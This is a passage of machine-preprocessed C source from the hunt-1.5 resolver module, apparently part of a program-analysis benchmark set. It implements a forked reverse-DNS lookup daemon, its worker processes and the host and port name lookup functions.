#line 115
  hash_lock(& ip_to_name_table);
#line 116
  hash_iter_set(& li, & ip_to_name_table);
  }
  {
#line 117
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 117
    tmp = hash_iter_get(& li, & ip);
#line 117
    r = (struct resolv_item *)tmp;
    }
#line 117
    if (! r) {
#line 117
      goto while_break;
    }
#line 118
    if (r->put_timestamp + 1200L < (time_t )__time) {
      {
#line 119
      resolv_remove(ip);
      }
    } else
#line 120
    if (r->get_timestamp - r->put_timestamp >= 600L) {
      {
#line 121
      resolv_request(ip);
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 123
  hash_iter_end(& li);
#line 124
  hash_unlock(& ip_to_name_table);
  }
#line 125
  return;
}
}
#line 127 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void *update_thr(void *arg ) 
{ 
  struct timeval timeout ;
  fd_set rdset ;
  int fd ;
  struct res r ;
  char buf[256] ;
  int update_thr_run ;
  int retval ;
  time_t __time ;
  time_t last_time_check ;
  __pid_t tmp ;
  __pid_t tmp___0 ;
  int __d0 ;
  int __d1 ;
  ssize_t tmp___1 ;
  ssize_t tmp___2 ;
  int tmp___3 ;

  {
  {
#line 131
  fd = (int )arg;
#line 139
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
  }
#line 140
  if (verbose) {
    {
#line 141
    tmp = getpid();
#line 141
    printf((char const   */* __restrict  */)"update resolv thread pid %d\n", tmp);
    }
  }
  {
#line 142
  tmp___0 = getpid();
#line 142
  setpriority(0, (id_t )tmp___0, 10);
#line 143
  update_thr_run = 1;
#line 144
  last_time_check = (time_t )0;
  }
  {
#line 145
  while (1) {
    while_continue: /* CIL Label */ ;
#line 145
    if (update_thr_run) {
      {
#line 145
      tmp___3 = pthread_kill(main_thread_id, 0);
      }
#line 145
      if (! (tmp___3 == 0)) {
#line 145
        goto while_break;
      }
    } else {
#line 145
      goto while_break;
    }
    {
#line 146
    while (1) {
      while_continue___0: /* CIL Label */ ;
#line 146
      __asm__  volatile   ("cld; rep; "
                           "stosq": "=c" (__d0), "=D" (__d1): "a" (0), "0" (sizeof(fd_set ) / sizeof(__fd_mask )),
                           "1" (& rdset.__fds_bits[0]): "memory");
#line 146
      goto while_break___0;
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 147
    rdset.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] |= 1L << fd % (8 * (int )sizeof(__fd_mask ));
#line 148
    timeout.tv_sec = (__time_t )10;
#line 149
    timeout.tv_usec = (__suseconds_t )0;
#line 150
    retval = select(fd + 1, (fd_set */* __restrict  */)(& rdset), (fd_set */* __restrict  */)((void *)0),
                    (fd_set */* __restrict  */)((void *)0), (struct timeval */* __restrict  */)(& timeout));
    }
#line 151
    if (retval > 0) {
#line 151
      if ((rdset.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] & (1L << fd % (8 * (int )sizeof(__fd_mask )))) != 0L) {
        {
#line 151
        tmp___2 = read(fd, (void *)(& r), sizeof(struct res ));
        }
#line 151
        if ((unsigned long )tmp___2 == sizeof(struct res )) {
#line 153
          if (r.err == 0) {
#line 153
            if (r.name_len) {
              {
#line 154
              tmp___1 = read(fd, (void *)(buf), (size_t )r.name_len);
              }
#line 154
              if (tmp___1 != (ssize_t )r.name_len) {
                {
#line 155
                printf((char const   */* __restrict  */)"bad read of len in update thr\n");
                }
              }
              {
#line 156
              buf[r.name_len] = (char)0;
#line 157
              resolv_put(r.ip, (char const   *)(buf));
              }
            }
          }
        }
      }
    }
    {
#line 160
    __time = time((time_t *)((void *)0));
    }
#line 161
    if (last_time_check + 10L < __time) {
      {
#line 162
      check_interval((int )__time);
#line 163
      last_time_check = __time;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 166
  return ((void *)0);
}
}
#line 172 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static int volatile   resolv_slave_run  ;
#line 173 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void sig_slave_term(int signum ) 
{ 


  {
#line 175
  resolv_slave_run = (int volatile   )0;
#line 176
  return;
}
}
#line 178 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void resolv_slave(int fd ) 
{ 
  struct sigaction sa ;
  struct in_addr addr ;
  struct hostent *host_ent ;
  struct timeval timeout ;
  char buf[256] ;
  struct res *res ;
  struct req req ;
  char *name ;
  fd_set rdset ;
  int retval ;
  __pid_t tmp ;
  int __d0 ;
  int __d1 ;
  size_t tmp___0 ;
  ssize_t tmp___1 ;
  __pid_t tmp___2 ;

  {
  {
#line 191
  tmp = getpid();
#line 191
  setpriority(0, (id_t )tmp, 10);
#line 192
  resolv_slave_run = (int volatile   )1;
#line 193
  sa.__sigaction_handler.sa_handler = & sig_slave_term;
#line 194
  sigemptyset(& sa.sa_mask);
#line 195
  sa.sa_flags = 268435456;
#line 196
  sigaction(15, (struct sigaction  const  */* __restrict  */)(& sa), (struct sigaction */* __restrict  */)((void *)0));
  }
  {
#line 198
  while (1) {
    while_continue: /* CIL Label */ ;
#line 198
    if (resolv_slave_run) {
      {
#line 198
      tmp___2 = getppid();
      }
#line 198
      if (! (tmp___2 != 1)) {
#line 198
        goto while_break;
      }
    } else {
#line 198
      goto while_break;
    }
    {
#line 199
    while (1) {
      while_continue___0: /* CIL Label */ ;
#line 199
      __asm__  volatile   ("cld; rep; "
                           "stosq": "=c" (__d0), "=D" (__d1): "a" (0), "0" (sizeof(fd_set ) / sizeof(__fd_mask )),
                           "1" (& rdset.__fds_bits[0]): "memory");
#line 199
      goto while_break___0;
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 200
    rdset.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] |= 1L << fd % (8 * (int )sizeof(__fd_mask ));
#line 201
    timeout.tv_sec = (__time_t )10;
#line 202
    timeout.tv_usec = (__suseconds_t )0;
#line 203
    retval = select(fd + 1, (fd_set */* __restrict  */)(& rdset), (fd_set */* __restrict  */)((void *)0),
                    (fd_set */* __restrict  */)((void *)0), (struct timeval */* __restrict  */)(& timeout));
    }
#line 204
    if (retval > 0) {
#line 204
      if ((rdset.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] & (1L << fd % (8 * (int )sizeof(__fd_mask )))) != 0L) {
        {
#line 204
        tmp___1 = read(fd, (void *)(& req), sizeof(struct req ));
        }
#line 204
        if ((unsigned long )tmp___1 == sizeof(struct req )) {
          {
#line 206
          addr.s_addr = req.ip;
#line 207
          host_ent = (struct hostent *)((void *)0);
#line 208
          host_ent = gethostbyaddr((void const   *)((char *)(& addr)), (__socklen_t )sizeof(struct in_addr ),
                                   2);
#line 210
          res = (struct res *)(buf);
          }
#line 211
          if (! host_ent) {
#line 213
            res->err = 1;
#line 214
            res->ip = req.ip;
#line 215
            res->name_len = 0;
          } else {
            {
#line 217
            name = host_ent->h_name;
#line 220
            res->err = 0;
#line 221
            res->ip = req.ip;
#line 222
            tmp___0 = strlen((char const   *)name);
#line 222
            res->name_len = (int )(tmp___0 + 1UL);
#line 223
            strcpy((char */* __restrict  */)(res->name), (char const   */* __restrict  */)name);
            }
#line 224
            if (! ((unsigned long )((void *)(res->name)) == (unsigned long )((void *)(res + 1)))) {
              {
#line 224
              __assert_fail("(void *) res->name == (void *)(res + 1)", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c",
                            224U, "resolv_slave");
              }
            }
          }
          {
#line 226
          write(fd, (void const   *)res, sizeof(struct res ) + (unsigned long )res->name_len);
          }
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 229
  close(fd);
#line 230
  exit(0);
  }
}
}
#line 234 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static int volatile   resolv_daemon_run  ;
#line 235 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void sig_term(int signum ) 
{ 


  {
#line 237
  resolv_daemon_run = (int volatile   )0;
#line 238
  return;
}
}
#line 240 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void send_req_to_slave(int fd , struct list *slaves , struct list *requests ) 
{ 
  struct list_iterator li ;
  struct slave *sl ;
  struct req *r ;
  struct req req ;
  int pipe___0[2] ;
  void *tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  void *tmp___2 ;
  void *tmp___3 ;
  void *tmp___4 ;
  pid_t tmp___5 ;
  int tmp___6 ;
  int tmp___7 ;

  {
  {
#line 248
  list_iter_set(& li, slaves);
  }
  {
#line 249
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 249
    tmp___0 = list_count(requests);
    }
#line 249
    if (tmp___0) {
      {
#line 249
      tmp___1 = list_iter_get(& li);
#line 249
      sl = (struct slave *)tmp___1;
      }
#line 249
      if (! sl) {
#line 249
        goto while_break;
      }
    } else {
#line 249
      goto while_break;
    }
#line 250
    if (sl->s_req.ip == 0U) {
      {
#line 251
      tmp = list_pop(requests);
#line 251
      r = (struct req *)tmp;
#line 252
      sl->s_req = *r;
#line 253
      sl->s_req.next = (struct req *)((void *)0);
#line 254
      sl->s_timestamp = time((time_t *)((void *)0));
#line 255
      req = *r;
#line 256
      req.next = (struct req *)((void *)0);
#line 257
      write(sl->s_fd, (void const   *)(& req), sizeof(struct req ));
#line 258
      free((void *)r);
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 261
  list_iter_end(& li);
  }
  {
#line 262
  while (1) {
    while_continue___0: /* CIL Label */ ;
    {
#line 262
    tmp___6 = list_count(requests);
    }
#line 262
    if (tmp___6) {
      {
#line 262
      tmp___7 = list_count(slaves);
      }
#line 262
      if (! (tmp___7 < 5)) {
#line 262
        goto while_break___0;
      }
    } else {
#line 262
      goto while_break___0;
    }
    {
#line 263
    tmp___2 = list_pop(requests);
#line 263
    r = (struct req *)tmp___2;
#line 264
    tmp___3 = malloc(sizeof(struct slave ));
#line 264
    sl = (struct slave *)tmp___3;
#line 265
    sl->s_req = *r;
#line 266
    sl->s_timestamp = time((time_t *)((void *)0));
#line 267
    req = *r;
#line 268
    free((void *)r);
#line 269
    socketpair(1, 1, 0, (int *)(pipe___0));
#line 270
    sl->s_fd = pipe___0[0];
#line 271
    tmp___5 = fork();
#line 271
    sl->s_pid = tmp___5;
    }
#line 271
    if (tmp___5 == 0) {
      {
#line 273
      close(pipe___0[0]);
#line 274
      close(fd);
#line 275
      list_iter_set(& li, slaves);
      }
      {
#line 276
      while (1) {
        while_continue___1: /* CIL Label */ ;
        {
#line 276
        tmp___4 = list_iter_get(& li);
#line 276
        sl = (struct slave *)tmp___4;
        }
#line 276
        if (! sl) {
#line 276
          goto while_break___1;
        }
        {
#line 277
        close(sl->s_fd);
        }
      }
      while_break___1: /* CIL Label */ ;
      }
      {
#line 278
      list_iter_end(& li);
#line 279
      resolv_slave(pipe___0[1]);
#line 280
      exit(0);
      }
    } else
#line 281
    if (sl->s_pid > 0) {
      {
#line 283
      close(pipe___0[1]);
#line 284
      list_enqueue(slaves, (void *)sl);
#line 285
      write(sl->s_fd, (void const   *)(& req), sizeof(struct req ));
      }
    } else {
      {
#line 287
      printf((char const   */* __restrict  */)"err launching dns slave\n");
      }
    }
  }
  while_break___0: /* CIL Label */ ;
  }
#line 289
  return;
}
}
#line 291 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void remove_idle_slaves(struct list *slaves ) 
{ 
  struct list_iterator li ;
  struct slave *sl ;
  time_t cur_time ;
  void *tmp ;

  {
  {
#line 297
  cur_time = time((time_t *)((void *)0));
#line 298
  list_iter_set(& li, slaves);
  }
  {
#line 299
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 299
    tmp = list_iter_get(& li);
#line 299
    sl = (struct slave *)tmp;
    }
#line 299
    if (! sl) {
#line 299
      goto while_break;
    }
#line 300
    if (sl->s_req.ip == 0U) {
#line 300
      if (sl->s_timestamp + 60L < cur_time) {
        {
#line 302
        kill(sl->s_pid, 15);
#line 303
        waitpid(sl->s_pid, (int *)((void *)0), 0);
#line 304
        close(sl->s_fd);
#line 305
        list_remove(slaves, (void *)sl);
#line 306
        free((void *)sl);
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 309
  list_iter_end(& li);
  }
#line 310
  return;
}
}
#line 312 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void cleanup_slaves(struct list *slaves ) 
{ 
  struct list_iterator li ;
  struct slave *sl ;
  void *tmp ;
  void *tmp___0 ;
  void *tmp___1 ;

  {
  {
#line 317
  list_iter_set(& li, slaves);
  }
  {
#line 318
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 318
    tmp = list_iter_get(& li);
#line 318
    sl = (struct slave *)tmp;
    }
#line 318
    if (! sl) {
#line 318
      goto while_break;
    }
    {
#line 319
    kill(sl->s_pid, 15);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 320
  list_iter_end(& li);
#line 321
  list_iter_set(& li, slaves);
  }
  {
#line 322
  while (1) {
    while_continue___0: /* CIL Label */ ;
    {
#line 322
    tmp___0 = list_iter_get(& li);
#line 322
    sl = (struct slave *)tmp___0;
    }
#line 322
    if (! sl) {
#line 322
      goto while_break___0;
    }
    {
#line 323
    waitpid(sl->s_pid, (int *)((void *)0), 0);
    }
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 324
  list_iter_end(& li);
  }
  {
#line 325
  while (1) {
    while_continue___1: /* CIL Label */ ;
    {
#line 325
    tmp___1 = list_pop(slaves);
#line 325
    sl = (struct slave *)tmp___1;
    }
#line 325
    if (! sl) {
#line 325
      goto while_break___1;
    }
    {
#line 326
    free((void *)sl);
    }
  }
  while_break___1: /* CIL Label */ ;
  }
#line 327
  return;
}
}
#line 329 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void handle_response(int fd , struct slave *sl ) 
{ 
  char buf[256] ;
  struct res *res ;
  ssize_t tmp ;

  {
  {
#line 334
  res = (struct res *)(buf);
#line 335
  tmp = read(sl->s_fd, (void *)(buf), sizeof(struct res ));
  }
#line 335
  if ((unsigned long )tmp == sizeof(struct res )) {
#line 336
    if (res->name_len) {
      {
#line 337
      read(sl->s_fd, (void *)(res + 1), (size_t )res->name_len);
      }
    }
#line 338
    if (res->err == 0) {
      {
#line 339
      write(fd, (void const   *)(buf), sizeof(struct res ) + (unsigned long )res->name_len);
      }
    }
    {
#line 341
    sl->s_req.ip = 0U;
#line 342
    sl->s_timestamp = time((time_t *)((void *)0));
    }
  }
#line 344
  return;
}
}
#line 346 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void resolv_daemon(int fd ) 
{ 
  struct list_iterator li ;
  struct sigaction sa ;
  struct req req ;
  struct list slaves ;
  struct list requests ;
  struct req *r ;
  fd_set select_fd ;
  int select_max ;
  struct timeval timeout ;
  struct slave *sl ;
  int retval ;
  __pid_t tmp ;
  __pid_t tmp___0 ;
  int __d0 ;
  int __d1 ;
  void *tmp___1 ;
  void *tmp___2 ;
  void *tmp___3 ;
  ssize_t tmp___4 ;
  int tmp___5 ;

  {
#line 351
  slaves.l_first = (void *)0;
#line 351
  slaves.l_last = (void *)0;
#line 351
  slaves.l_off = (int )((char *)(& ((struct slave *)0)->s_next) - (char *)0);
#line 351
  slaves.l_produce_done = 0;
#line 351
  slaves.l_iter = (struct list_iterator *)((void *)0);
#line 351
  slaves.l_locked = 0;
#line 351
  slaves.l_mutex.__data.__lock = 0;
#line 351
  slaves.l_mutex.__data.__count = 0U;
#line 351
  slaves.l_mutex.__data.__owner = 0;
#line 351
  slaves.l_mutex.__data.__nusers = 0U;
#line 351
  slaves.l_mutex.__data.__kind = 0;
#line 351
  slaves.l_mutex.__data.__spins = (short)0;
#line 351
  slaves.l_mutex.__data.__elision = (short)0;
#line 351
  slaves.l_mutex.__data.__list.__prev = (struct __pthread_internal_list *)0;
#line 351
  slaves.l_mutex.__data.__list.__next = (struct __pthread_internal_list *)0;
#line 351
  slaves.l_notempty.__data.__lock = 0;
#line 351
  slaves.l_notempty.__data.__futex = 0U;
#line 351
  slaves.l_notempty.__data.__total_seq = 0ULL;
#line 351
  slaves.l_notempty.__data.__wakeup_seq = 0ULL;
#line 351
  slaves.l_notempty.__data.__woken_seq = 0ULL;
#line 351
  slaves.l_notempty.__data.__mutex = (void *)0;
#line 351
  slaves.l_notempty.__data.__nwaiters = 0U;
#line 351
  slaves.l_notempty.__data.__broadcast_seq = 0U;
#line 351
  slaves.l_locked_thr = (pthread_t )0;
#line 352
  requests.l_first = (void *)0;
#line 352
  requests.l_last = (void *)0;
#line 352
  requests.l_off = (int )((char *)(& ((struct req *)0)->next) - (char *)0);
#line 352
  requests.l_produce_done = 0;
#line 352
  requests.l_iter = (struct list_iterator *)((void *)0);
#line 352
  requests.l_locked = 0;
#line 352
  requests.l_mutex.__data.__lock = 0;
#line 352
  requests.l_mutex.__data.__count = 0U;
#line 352
  requests.l_mutex.__data.__owner = 0;
#line 352
  requests.l_mutex.__data.__nusers = 0U;
#line 352
  requests.l_mutex.__data.__kind = 0;
#line 352
  requests.l_mutex.__data.__spins = (short)0;
#line 352
  requests.l_mutex.__data.__elision = (short)0;
#line 352
  requests.l_mutex.__data.__list.__prev = (struct __pthread_internal_list *)0;
#line 352
  requests.l_mutex.__data.__list.__next = (struct __pthread_internal_list *)0;
#line 352
  requests.l_notempty.__data.__lock = 0;
#line 352
  requests.l_notempty.__data.__futex = 0U;
#line 352
  requests.l_notempty.__data.__total_seq = 0ULL;
#line 352
  requests.l_notempty.__data.__wakeup_seq = 0ULL;
#line 352
  requests.l_notempty.__data.__woken_seq = 0ULL;
#line 352
  requests.l_notempty.__data.__mutex = (void *)0;
#line 352
  requests.l_notempty.__data.__nwaiters = 0U;
#line 352
  requests.l_notempty.__data.__broadcast_seq = 0U;
#line 352
  requests.l_locked_thr = (pthread_t )0;
#line 360
  if (verbose) {
    {
#line 361
    tmp = getpid();
#line 361
    printf((char const   */* __restrict  */)"resolv daemon pid %d\n", tmp);
    }
  }
  {
#line 362
  tmp___0 = getpid();
#line 362
  setpriority(0, (id_t )tmp___0, 10);
#line 363
  resolv_daemon_run = (int volatile   )1;
#line 364
  sa.__sigaction_handler.sa_handler = & sig_term;
#line 365
  sigemptyset(& sa.sa_mask);
#line 366
  sa.sa_flags = 268435456;
#line 367
  sigaction(15, (struct sigaction  const  */* __restrict  */)(& sa), (struct sigaction */* __restrict  */)((void *)0));
  }
  {
#line 369
  while (1) {
    while_continue: /* CIL Label */ ;
#line 369
    if (resolv_daemon_run) {
      {
#line 369
      tmp___5 = kill(pid_parent, 0);
      }
#line 369
      if (! (tmp___5 == 0)) {
#line 369
        goto while_break;
      }
    } else {
#line 369
      goto while_break;
    }
    {
#line 370
    while (1) {
      while_continue___0: /* CIL Label */ ;
#line 370
      __asm__  volatile   ("cld; rep; "
                           "stosq": "=c" (__d0), "=D" (__d1): "a" (0), "0" (sizeof(fd_set ) / sizeof(__fd_mask )),
                           "1" (& select_fd.__fds_bits[0]): "memory");
#line 370
      goto while_break___0;
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 371
    select_max = 0;
#line 372
    list_iter_set(& li, & slaves);
    }
    {
#line 373
    while (1) {
      while_continue___1: /* CIL Label */ ;
      {
#line 373
      tmp___1 = list_iter_get(& li);
#line 373
      sl = (struct slave *)tmp___1;
      }
#line 373
      if (! sl) {
#line 373
        goto while_break___1;
      }
#line 374
      select_fd.__fds_bits[sl->s_fd / (8 * (int )sizeof(__fd_mask ))] |= 1L << sl->s_fd % (8 * (int )sizeof(__fd_mask ));
#line 375
      if (select_max > sl->s_fd) {
#line 375
        select_max = select_max;
      } else {
#line 375
        select_max = sl->s_fd;
      }
    }
    while_break___1: /* CIL Label */ ;
    }
    {
#line 377
    list_iter_end(& li);
#line 378
    select_fd.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] |= 1L << fd % (8 * (int )sizeof(__fd_mask ));
    }
#line 379
    if (select_max > fd) {
#line 379
      select_max = select_max;
    } else {
#line 379
      select_max = fd;
    }
    {
#line 380
    timeout.tv_sec = (__time_t )10;
#line 381
    timeout.tv_usec = (__suseconds_t )0;
#line 383
    retval = select(select_max + 1, (fd_set */* __restrict  */)(& select_fd), (fd_set */* __restrict  */)((void *)0),
                    (fd_set */* __restrict  */)((void *)0), (struct timeval */* __restrict  */)(& timeout));
    }
#line 384
    if (retval > 0) {
      {
#line 386
      list_iter_set(& li, & slaves);
      }
      {
#line 387
      while (1) {
        while_continue___2: /* CIL Label */ ;
        {
#line 387
        tmp___2 = list_iter_get(& li);
#line 387
        sl = (struct slave *)tmp___2;
        }
#line 387
        if (! sl) {
#line 387
          goto while_break___2;
        }
#line 388
        if ((select_fd.__fds_bits[sl->s_fd / (8 * (int )sizeof(__fd_mask ))] & (1L << sl->s_fd % (8 * (int )sizeof(__fd_mask )))) != 0L) {
          {
#line 389
          handle_response(fd, sl);
          }
        }
      }
      while_break___2: /* CIL Label */ ;
      }
      {
#line 391
      list_iter_end(& li);
      }
#line 394
      if ((select_fd.__fds_bits[fd / (8 * (int )sizeof(__fd_mask ))] & (1L << fd % (8 * (int )sizeof(__fd_mask )))) != 0L) {
        {
#line 395
        tmp___4 = read(fd, (void *)(& req), sizeof(struct req ));
        }
#line 395
        if ((unsigned long )tmp___4 == sizeof(struct req )) {
          {
#line 396
          tmp___3 = malloc(sizeof(struct req ));
#line 396
          r = (struct req *)tmp___3;
#line 397
          *r = req;
#line 398
          list_enqueue(& requests, (void *)r);
          }
        }
      }
      {
#line 401
      send_req_to_slave(fd, & slaves, & requests);
      }
    }
    {
#line 403
    remove_idle_slaves(& slaves);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 405
  cleanup_slaves(& slaves);
#line 406
  close(fd);
#line 407
  exit(0);
  }
}
}
#line 413 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static char hostname_buf[512]  = {      (char)0};
#line 414 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static int hostname_idx  =    0;
#line 411 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
char *host_lookup(unsigned int in , int use_mode ) 
{ 
  struct in_addr addr ;
  char *name ;
  char *retval ;
  int len ;
  struct hostent *host_ent ;
  struct resolv_item *r ;
  char *tmp ;
  size_t tmp___0 ;

  {
#line 421
  addr.s_addr = in;
#line 422
  host_ent = (struct hostent *)((void *)0);
#line 424
  if (in == 0U) {
    {
#line 425
    tmp = inet_ntoa(addr);
    }
#line 425
    return (tmp);
  }
#line 426
  r = (struct resolv_item *)((void *)0);
  {
#line 428
  if (use_mode == 2) {
#line 428
    goto case_2;
  }
#line 439
  if (use_mode == 1) {
#line 439
    goto case_1;
  }
#line 447
  goto switch_default;
  case_2: /* CIL Label */ 
  {
#line 429
  r = resolv_get(in);
  }
#line 429
  if (r) {
#line 437
    name = r->name;
  } else {
    {
#line 430
    host_ent = gethostbyaddr((void const   *)((char *)(& addr)), (__socklen_t )sizeof(struct in_addr ),
                             2);
    }
#line 432
    if (! host_ent) {
      {
#line 433
      name = inet_ntoa(addr);
      }
    } else {
#line 435
      name = host_ent->h_name;
    }
  }
#line 438
  goto switch_break;
  case_1: /* CIL Label */ 
  {
#line 440
  r = resolv_get(in);
  }
#line 440
  if (r) {
#line 444
    name = r->name;
  } else {
    {
#line 441
    resolv_request(in);
#line 442
    name = inet_ntoa(addr);
    }
  }
#line 445
  goto switch_break;
  switch_default: /* CIL Label */ 
  {
#line 448
  name = inet_ntoa(addr);
  }
#line 449
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 452
  tmp___0 = strlen((char const   *)name);
#line 452
  len = (int )tmp___0;
  }
#line 453
  if ((unsigned long )((len + hostname_idx) + 1) > sizeof(hostname_buf)) {
#line 454
    hostname_idx = 0;
  }
  {
#line 455
  retval = hostname_buf + hostname_idx;
#line 455
  strcpy((char */* __restrict  */)retval, (char const   */* __restrict  */)name);
#line 456
  hostname_idx += len + 1;
  }
#line 457
  if (r) {
    {
#line 458
    resolv_release(r);
    }
  }
#line 459
  return (retval);
}
}
#line 465 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_init(void) 
{ 
  int pipe___0[2] ;
  pthread_t res_update_thr ;

  {
  {
#line 470
  pid_parent = getppid();
#line 471
  socketpair(1, 1, 0, (int *)(pipe___0));
#line 472
  pid_req = fork();
  }
#line 472
  if (pid_req == 0) {
    {
#line 474
    close(pipe___0[0]);
#line 475
    sigprocmask(0, (sigset_t const   */* __restrict  */)(& intr_mask), (sigset_t */* __restrict  */)((void *)0));
#line 476
    resolv_daemon(pipe___0[1]);
    }
  } else
#line 477
  if (pid_req < 0) {
    {
#line 478
    printf((char const   */* __restrict  */)"dns daemon failed to start - exiting\n");
#line 479
    exit(1);
    }
  }
  {
#line 481
  close(pipe___0[1]);
#line 482
  fd_req = pipe___0[0];
#line 484
  hash_init(& ip_to_name_table, 100, (int (*)(unsigned int key , void *data_ht , void *arg ))((void *)0));
#line 485
  pthread_create((pthread_t */* __restrict  */)(& res_update_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 & update_thr, (void */* __restrict  */)((void *)fd_req));
  }
#line 486
  return;
}
}
#line 488 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_done(void) 
{ 


  {
  {
#line 490
  kill(pid_req, 15);
#line 491
  waitpid(pid_req, (int *)((void *)0), 0);
  }
#line 492
  return;
}
}
#line 497 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static char servname_buf[512]  = {      (char)0};
#line 498 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static int servname_idx  =    0;
#line 495 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
char *port_lookup(unsigned short serv , int use_mode ) 
{ 
  char name_buf[64] ;
  char *name ;
  char *retval ;
  int len ;
  struct servent *serv_ent ;
  uint16_t tmp ;
  size_t tmp___0 ;

  {
#line 504
  if ((int )serv == 0) {
#line 505
    return ((char *)"0");
  }
  {
#line 509
  if (use_mode == 1) {
#line 509
    goto case_1;
  }
#line 509
  if (use_mode == 2) {
#line 509
    goto case_1;
  }
#line 518
  goto switch_default;
  case_1: /* CIL Label */ 
  case_2: /* CIL Label */ 
  {
#line 510
  serv_ent = getservbyport((int )serv, "tcp");
  }
#line 511
  if (! (! serv_ent)) {
#line 514
    name = serv_ent->s_name;
#line 515
    goto switch_break;
  }
  switch_default: /* CIL Label */ 
  {
#line 519
  name = name_buf;
#line 520
  tmp = ntohs(serv);
#line 520
  sprintf((char */* __restrict  */)name, (char const   */* __restrict  */)"%d", (int )tmp);
  }
#line 521
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 524
  tmp___0 = strlen((char const   *)name);
#line 524
  len = (int )tmp___0;
  }
#line 525
  if ((unsigned long )((len + servname_idx) + 1) > sizeof(servname_buf)) {
#line 526
    servname_idx = 0;
  }
  {
#line 527
  retval = servname_buf + servname_idx;
#line 527
  strcpy((char */* __restrict  */)retval, (char const   */* __restrict  */)name);
#line 528
  servname_idx += len + 1;
  }
#line 529
  return (retval);
}
}
#line 532 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
unsigned short service_lookup(char *name ) 
{ 
  struct servent *serv_ent ;
  uint16_t tmp ;

  {
  {
#line 536
  serv_ent = getservbyname((char const   *)name, "tcp");
  }
#line 536
  if (serv_ent) {
    {
#line 539
    tmp = htons((uint16_t )serv_ent->s_port);
    }
#line 539
    return (tmp);
  } else {
#line 537
    return ((unsigned short)0);
  }
}
}
